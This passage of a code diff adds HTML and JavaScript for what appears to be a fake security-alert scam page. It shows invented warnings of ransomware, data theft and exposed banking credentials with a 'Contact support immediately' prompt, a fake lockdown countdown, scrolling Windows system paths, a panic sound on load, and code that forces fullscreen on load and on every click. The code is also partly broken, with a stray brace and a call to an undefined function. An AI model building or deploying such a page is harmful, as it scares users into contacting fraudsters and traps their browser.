+                    <div class="threat-icon"></div>
+                    <div class="threat-text">
+                        <div class="threat-name">${randomMessage.title}</div>
+                        <div class="threat-description">${randomMessage.details}</div>
+                    </div>
+                </div>
+                <div class="threat-item">
+                    <div class="threat-icon"></div>
+                    <div class="threat-text">
+                        <div class="threat-name">System Files at Risk</div>
+                        <div class="threat-description">Critical system files are being modified.</div>
+                    </div>
+                </div>
+                <div class="threat-item">
+                    <div class="threat-icon"></div>
+                    <div class="threat-text">
+                        <div class="threat-name">Data Theft in Progress</div>
+                        <div class="threat-description">Personal information is being accessed.</div>
+                    </div>
+                </div>
+            `;
+        }
+
+        // Start showing alerts after a short delay
+        setTimeout(showMoreAlerts, 2000);
+
+        // Alert2 functionality
+        let alert2StartTime = null;
+        const alert2Duration = 60000; // 1 minute
+
+        // Processing messages for alert2
+        const alert2ProcessingMessages = [
+            "Scanning system files...",
+            "Analyzing threat patterns...",
+            "Checking system integrity...",
+            "Monitoring network activity...",
+            "Verifying security protocols...",
+            "Detecting unauthorized access...",
+            "Analyzing encryption attempts...",
+            "Checking for data breaches...",
+            "Monitoring system changes...",
+            "Verifying user credentials..."
+        ];
+
+        // File list entries for alert2
+        const alert2FileEntries = [
+            "C:/Windows/System32/config/SAM",
+            "C:/Users/Administrator/Documents/",
+            "C:/Program Files/",
+            "C:/Windows/System32/drivers/",
+            "C:/Users/Public/Documents/",
+            "C:/Windows/System32/winevt/Logs/",
+            "C:/ProgramData/Microsoft/Windows/",
+            "C:/Users/Administrator/AppData/",
+            "C:/Windows/System32/CatRoot/",
+            "C:/Windows/System32/config/RegBack/"
+        ];
+
+        let currentAlert2MessageIndex = 0;
+        let currentAlert2FileIndex = 0;
+
+        function updateAlert2SystemTime() {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString('en-US', { 
+                hour12: false, 
+                hour: '2-digit', 
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            document.getElementById('alert2SystemTime').textContent = timeString;
+        }
+
+        function updateAlert2ProcessingMessage() {
+            const messageElement = document.getElementById('alert2ProcessingMessage');
+            messageElement.textContent = alert2ProcessingMessages[currentAlert2MessageIndex] + " _";
+            currentAlert2MessageIndex = (currentAlert2MessageIndex + 1) % alert2ProcessingMessages.length;
+        }
+
+        function updateAlert2FileList() {
+            const fileListElement = document.getElementById('alert2FileList');
+            const newFile = alert2FileEntries[currentAlert2FileIndex];
+            const fileElement = document.createElement('p');
+            fileElement.textContent = newFile;
+            fileListElement.appendChild(fileElement);
+            
+            while (fileListElement.children.length > 5) {
+                fileListElement.removeChild(fileListElement.firstChild);
+            }
+            
+            currentAlert2FileIndex = (currentAlert2FileIndex + 1) % alert2FileEntries.length;
+        }
+
+        function updateAlert2LockdownTimer() {
+            if (!alert2StartTime) return;
+
+            const currentTime = new Date().getTime();
+            const elapsedTime = currentTime - alert2StartTime;
+            const remainingTime = Math.max(0, alert2Duration - elapsedTime);
+            
+            const minutes = Math.floor(remainingTime / 60000);
+            const seconds = Math.floor((remainingTime % 60000) / 1000);
+            
+            const timerElement = document.getElementById('alert2LockdownTimer');
+            timerElement.textContent = `LOCKDOWN: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (remainingTime < 10000) {
+                timerElement.classList.add('warning');
+            }
+
+            if (remainingTime > 0) {
+                setTimeout(updateAlert2LockdownTimer, 1000);
+            } else {
+                document.getElementById('alert2Container').style.display = 'none';
+            }
+        }
+
+        function showMoreAlert2Alerts() {
+            const messages = [
+                {
+                    title: "SYSTEM COMPROMISED",
+                    details: [
+                        "⚠️ Ransomware encryption in progress",
+                        "⚠️ All files will be locked in 2 minutes",
+                        "⚠️ Payment demand incoming",
+                        "⚠️ Contact support immediately"
+                    ]
+                },
+                {
+                    title: "CRITICAL BREACH",
+                    details: [
+                        "⚠️ Multiple backdoors detected",
+                        "⚠️ Remote access established",
+                        "⚠️ Data exfiltration in progress",
+                        "⚠️ System integrity compromised"
+                    ]
+                },
+                {
+                    title: "EMERGENCY ALERT",
+                    details: [
+                        "⚠️ Banking credentials exposed",
+                        "⚠️ Credit card data at risk",
+                        "⚠️ Identity theft in progress",
+                        "⚠️ Immediate action required"
+                    ]
+                }
+            ];
+
+            const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+            document.querySelector('.alert2-message').textContent = randomMessage.title;
+            
+            const detailsHtml = randomMessage.details.map(detail => `<p>${detail}</p>`).join('');
+            document.querySelector('.alert2-details').innerHTML = detailsHtml;
+        }
+
+        // Add random system-like messages
+        const systemMessages = [
+            "Attempting to restore system services...",
+            "Analyzing system modifications...",
+            "Checking for system file integrity...",
+            "Verifying security protocols...",
+            "Scanning for additional threats...",
+            "Attempting to block unauthorized access...",
+            "Checking system registry modifications...",
+            "Analyzing network connections...",
+            "Verifying system boot records...",
+            "Checking for persistence mechanisms..."
+        ];
+
+        function showRandomSystemMessage() {
+            const randomMessage = systemMessages[Math.floor(Math.random() * systemMessages.length)];
+            console.log(`[SYSTEM] ${randomMessage}`);
+        }
+
+        // Show random system messages every 2-4 seconds
+        setInterval(showRandomSystemMessage, Math.random() * 2000 + 2000);
+
+        // Simple audio play function
+        function playSound() {
+            try {
+                const sound = document.getElementById('panicSound');
+                sound.volume = 0.7;
+                sound.play();
+            } catch(e) {
+                console.log('Sound error:', e);
+            }
+        }
+    
+
+    }// Play sound when page loads
+        document.addEventListener('DOMContentLoaded', playSound);
+        
+        // Also try to play on window load
+        window.onload = function() {
+            playSound();
+            // Rest of your existing onload code...
+        };
+    </script>
+
+    <script>
+      // Request fullscreen for the document element after the DOM is loaded
+      document.addEventListener('DOMContentLoaded', function() {
+          const element = document.documentElement;
+          if (element.requestFullscreen) {
+            element.requestFullscreen();
+          } else if (element.mozRequestFullScreen) { /* Firefox */
+            element.mozRequestFullScreen();
+          } else if (element.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
+            element.webkitRequestFullscreen();
+          } else if (element.msRequestFullscreen) { /* IE/Edge */
+            element.msRequestFullscreen();
+          }
+      });
+    </script>
+
+    <script>
+        // Function to enter fullscreen
+        function enterFullscreen() {
+            const element = document.documentElement;
+            if (element.requestFullscreen) {
+                element.requestFullscreen();
+            } else if (element.mozRequestFullScreen) { /* Firefox */
+                element.mozRequestFullScreen();
+            } else if (element.webkitRequestFullscreen) { /* Chrome, Safari and Opera */
+                element.webkitRequestFullscreen();
+            } else if (element.msRequestFullscreen) { /* IE/Edge */
+                element.msRequestFullscreen();
+            }
+        }
+
+        // Add click event listener to the entire document
+        document.addEventListener('click', function(e) {
+            // Prevent default behavior
+            e.preventDefault();
+            // Enter fullscreen
+            enterFullscreen();
+        });
+
+        // Also try to enter fullscreen when page loads
+        window.addEventListener('load', enterFullscreen);
+        document.addEventListener('DOMContentLoaded', enterFullscreen);
+
+        // Force play audio immediately
+        forcePlay();
+    </script>
+</body>
+</html> 
